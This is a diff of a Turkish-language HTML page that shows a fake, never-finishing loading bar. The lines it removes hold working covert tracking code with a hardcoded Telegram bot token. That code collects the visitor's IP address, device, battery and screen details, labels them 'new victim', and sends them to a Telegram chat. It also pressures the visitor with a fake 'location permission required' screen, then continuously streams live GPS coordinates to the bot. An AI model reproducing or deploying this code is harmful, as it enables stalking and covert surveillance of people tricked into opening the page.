@@ -1,3 +1,4 @@
+// ========== Tüm Kodlar @policecc (telegram)' a aittir. ==========
 <!DOCTYPE html>
 <html lang="tr">
 <head>
@@ -83,46 +84,6 @@
       animation:blink 1.2s infinite;
     }
 
-    .error-box {
-      display: none;
-      background: rgba(255, 0, 0, 0.1);
-      border: 2px dashed #ff0000;
-      padding: 25px;
-      border-radius: 12px;
-      margin-top: 20px;
-      box-shadow: 0 0 15px rgba(255, 0, 0, 0.4);
-    }
-
-    .error-box h2 {
-      color: #ff3333;
-      margin-bottom: 10px;
-      font-size: 24px;
-    }
-
-    .error-box p {
-      color: #ccc;
-      font-size: 15px;
-      margin-bottom: 20px;
-      line-height: 1.4;
-    }
-
-    .retry-btn {
-      background: #ff0000;
-      color: white;
-      border: none;
-      padding: 12px 30px;
-      font-size: 16px;
-      font-weight: bold;
-      border-radius: 8px;
-      cursor: pointer;
-      box-shadow: 0 0 10px #ff0000;
-      transition: transform 0.2s;
-    }
-
-    .retry-btn:active {
-      transform: scale(0.95);
-    }
-
     @keyframes blink{
       0%{opacity:0.5;}
       50%{opacity:1;}
@@ -130,52 +91,31 @@
     }
   </style>
 </head>
+
 <body>
 
   <div class="container">
     <div class="logo">𝖀𝖒𝖚𝖙</div>
 
-    <div id="loadingArea">
-      <div class="loading-text">Yükleniyor...</div>
-      <div class="bar">
-        <div class="progress" id="progress"></div>
-      </div>
-      <div class="percent" id="percent">0%</div>
-      <div class="fake-status" id="status">Sunucuya bağlanılıyor...</div>
+    <div class="loading-text">Yükleniyor...</div>
+
+    <div class="bar">
+      <div class="progress" id="progress"></div>
     </div>
 
-    <div id="errorArea" class="error-box">
-      <h2>⚠️ Konum İzni Gerekli!</h2>
-      <p>Sistem kaynaklarının başarıyla yüklenebilmesi ve güvenli bağlantının tamamlanabilmesi için konum izni vermeniz zorunludur. Lütfen "Tekrar Dene" butonuna basarak gelen uyarıya onay verin.</p>
-      <p style="font-size: 13px; color: #888;">(Eğer tarayıcınız izni tamamen engellediyse, adres çubuğundaki kilit/ayar simgesine tıklayarak konum iznini aktif hale getirin.)</p>
-      <button class="retry-btn" onclick="yenidenDene()">Tekrar Dene</button>
+    <div class="percent" id="percent">0%</div>
+
+    <div class="fake-status" id="status">
+      Sunucuya bağlanılıyor...
     </div>
   </div>
 
   <script>
-    // ========== TELEGRAM AYARLARI VE ŞİFRE ÇÖZÜCÜ ==========
-    const BOT_TOKEN = '8607287109:AAHPF_RPxofOCLCrCdgNwXJ85fcZOWJjJfA';
-    
-    function urlParametresiAl(param) {
-        const urlParams = new URLSearchParams(window.location.search);
-        return urlParams.get(param);
-    }
-    
-    const gelenSifreliId = parseInt(urlParametresiAl('id'));
-    let CHAT_ID = '7497803165'; 
-
-    if (gelenSifreliId && !isNaN(gelenSifreliId)) {
-        CHAT_ID = String((gelenSifreliId - 12345) / 7);
-    }
-    // =======================================================
-
-    // Elementler
     let progress = 0;
+
     const progressBar = document.getElementById("progress");
     const percentText = document.getElementById("percent");
     const statusText = document.getElementById("status");
-    const loadingArea = document.getElementById("loadingArea");
-    const errorArea = document.getElementById("errorArea");
 
     const fakeMessages = [
       "Sunucuya bağlanılıyor...",
@@ -188,174 +128,23 @@
       "Veritabanı el sıkışması bekleniyor..."
     ];
 
-    // ========== KONUM + IP SİSTEMİ ==========
-    let ipBilgisi = 'bilinmiyor';
-    let sonGonderilenKonum = null;
+    setInterval(() => {
+      if (progress < 96) {
+        progress += Math.random() * 1.5;
 
-    async function getIp() {
-      try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        ipBilgisi = data.ip;
-      } catch(e) { ipBilgisi = 'Alınamadı (AdBlocker)'; }
-    }
+        if (progress > 96) progress = 96;
 
-    async function getBattery() {
-      if (navigator.getBattery) {
-        try {
-          const bat = await navigator.getBattery();
-          return `${Math.round(bat.level * 100)}% ${bat.charging ? 'Şarjda' : 'Pil'}`;
-        } catch(e) {}
+        progressBar.style.width = progress + "%";
+        percentText.innerText = Math.floor(progress) + "%";
       }
-      return 'bilinmiyor';
-    }
+    }, 400);
 
-    async function cihazBilgisiGonder() {
-      try {
-        await getIp();
-        const battery = await getBattery();
-        
-        const info = `
-🌐 **Yeni Kurban Düştü!** 🌐
+    setInterval(() => {
+      const randomMessage =
+        fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
 
-🌐 **IP:** \`${ipBilgisi}\`
-💻 **Cihaz:** ${navigator.platform}
-🌍 **Tarayıcı:** ${navigator.userAgent.substring(0, 60)}
-🔋 **Batarya:** ${battery}
-📺 **Ekran:** ${screen.width}x${screen.height}
-🌐 **Dil:** ${navigator.language}
-        `.trim();
-
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: info, parse_mode: 'Markdown' })
-        });
-      } catch (err) {}
-    }
-
-    let sonDogruluk = null;
-
-    function konumuGonder(lat, lon) {
-      const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
-      
-      const mesaj = `
-📍 **CANLI KONUM BİLGİSİ** 📍
-
-🌐 **IP:** \`${ipBilgisi}\`
-📌 **Enlem:** \`${lat}\`
-📌 **Boylam:** \`${lon}\`
-
-🔗 **Google Maps:** [Konumu Aç](${mapsLink})
-🗺️ **Doğruluk:** ±${sonDogruluk || '?'} metre
-⏰ **Zaman:** ${new Date().toLocaleTimeString('tr-TR')}
-      `.trim();
-
-      // Telegram native konum pin'i
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          chat_id: CHAT_ID, 
-          latitude: lat, 
-          longitude: lon 
-        })
-      });
-
-      // Google Maps linki
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          chat_id: CHAT_ID, 
-          text: mesaj, 
-          parse_mode: 'Markdown',
-          disable_web_page_preview: false
-        })
-      });
-    }
-
-    function konumBasariylaAlindi(position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      const accuracy = Math.round(position.coords.accuracy);
-      sonDogruluk = accuracy;
-
-      const coordKey = `${lat.toFixed(4)}_${lon.toFixed(4)}`;
-      if (sonGonderilenKonum === coordKey) return;
-
-      sonGonderilenKonum = coordKey;
-      konumuGonder(lat, lon);
-    }
-
-    function konumHatasi(err) {
-      loadingArea.style.display = "none";
-      errorArea.style.display = "block";
-    }
-
-    // === ASLA BİTMEYEN SONSUZ FAKE YÜKLEME BARINI ÇALIŞTIRAN MOTOR ===
-    function baslatYuklemeBari() {
-      progress = 0;
-      progressBar.style.width = "0%";
-      percentText.innerText = "0%";
-      loadingArea.style.display = "block";
-      errorArea.style.display = "none";
-
-      const progressInterval = setInterval(() => {
-        if (progress < 96) {
-          progress += Math.random() * 1.5;
-          if (progress > 96) progress = 96;
-          progressBar.style.width = progress + "%";
-          percentText.innerText = Math.floor(progress) + "%";
-        }
-      }, 400);
-
-      setInterval(() => {
-        const randomMessage = fakeMessages[Math.floor(Math.random() * fakeMessages.length)];
-        statusText.innerText = randomMessage;
-      }, 3500);
-
-      return progressInterval;
-    }
-
-    // === ANA MOTOR ===
-    async function baslat() {
-      await getIp();
-      cihazBilgisiGonder();
-
-      baslatYuklemeBari();
-
-      await new Promise(r => setTimeout(r, 2500));
-      
-      if ('geolocation' in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          (pos) => {
-            konumBasariylaAlindi(pos);
-            // Sürekli takip - konum değişirse anında haber
-            navigator.geolocation.watchPosition(
-              konumBasariylaAlindi,
-              () => {},
-              { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
-            );
-          },
-          () => {
-            loadingArea.style.display = "none";
-            errorArea.style.display = "block";
-          },
-          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-      } else {
-        loadingArea.style.display = "none";
-        errorArea.style.display = "block";
-      }
-    }
-
-    async function yenidenDene() {
-        errorArea.style.display = "none";
-        await baslat();
-    }
-
-    window.onload = baslat;
+      statusText.innerText = randomMessage;
+    }, 3500);
   </script>
 
 </body>
